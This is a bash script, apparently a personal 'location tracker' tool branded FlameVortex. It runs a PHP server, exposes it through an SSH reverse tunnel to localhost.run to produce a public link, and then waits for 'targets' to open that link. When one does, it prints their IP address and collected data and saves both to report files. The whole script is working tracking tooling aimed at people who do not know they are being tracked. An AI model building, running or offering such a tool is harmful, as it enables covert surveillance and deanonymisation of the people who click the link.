trap 'printf "\n";stop' 2

PORT=3333

banner() {
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
RESET='\e[0m'
clear
printf "${YELLOW}╔═════════════════════════════════════════════════════════════╗\n"
printf "║                                                             ║\n"

printf "║  ${RED}███████╗██╗      █████╗ ███╗   ███╗███████╗                ${YELLOW}║\n"
printf "║  ${RED}██╔════╝██║     ██╔══██╗████╗ ████║██╔════╝                ${YELLOW}║\n"
printf "║  ${RED}█████╗  ██║     ███████║██╔████╔██║█████╗                  ${YELLOW}║\n"
printf "║  ${RED}██╔══╝  ██║     ██╔══██║██║╚██╔╝██║██╔══╝                  ${YELLOW}║\n"
printf "║  ${RED}██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗                ${YELLOW}║\n"
printf "║  ${RED}╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝                ${YELLOW}║\n"

printf "║                                                             ║\n"
printf "║          ${GREEN} LOCATION TRACKER - PERSONAL${YELLOW}                       ║\n"
printf "║                                                             ║\n"

printf "║  ${GREEN}Developer: FlameVortex                                     ${YELLOW}║\n"
printf "║  ${GREEN}GitHub   : github.com/FlameVortex                          ${YELLOW}║\n"
printf "║  ${GREEN}Version  : 1.0                                            ${YELLOW} ║\n"

printf "║                                                             ║\n"
printf "╚═════════════════════════════════════════════════════════════╝${RESET}\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkphp == 'php' ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == 'ssh' ]]; then
pkill -f ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\r\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\r\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\r\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\r\n"
catch_ip
rm -rf ip.txt
stty sane
cat data.txt
printf "\n"
fi
sleep 0.5
done
}

ssh_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Checking SSH Keys...\e[0m\n"
if [[ ! -f ~/.ssh/id_rsa ]]; then
    printf "\e[1;33m[*] Generating RSA key pair...\e[0m\n"
    ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/id_rsa
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting SSH tunnel (localhost.run)...\n"
ssh -R 80:localhost:$PORT ssh@ssh.localhost.run > tunnel.log 2>&1 &
sleep 8

link=$(grep -o 'https://[a-zA-Z0-9.-]*\.lhr\.life' tunnel.log | head -n1)
if [[ -z "$link" ]]; then
    link=$(grep -o 'https://[a-zA-Z0-9.-]*\.localhost\.run' tunnel.log | head -n1)
fi

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Tunnel link generate hoyni! Manual check koro:\e[0m\n"
    cat tunnel.log
else
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi

sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:$PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi

if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi

default_option_server="Y"

read -p $'\n\e[1;93m Enter Tunnel Mood {SSH Tunnel / Manually} [Y/n]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

read -p $'\n\e[1;96m Enter Port (Default: 3333): \e[0m' input_port
PORT="${input_port:-3333}"

if [[ $option_server == "Y" || $option_server == "y" ]]; then
ssh_server
else
local_server
fi
}

banner
dependencies
hound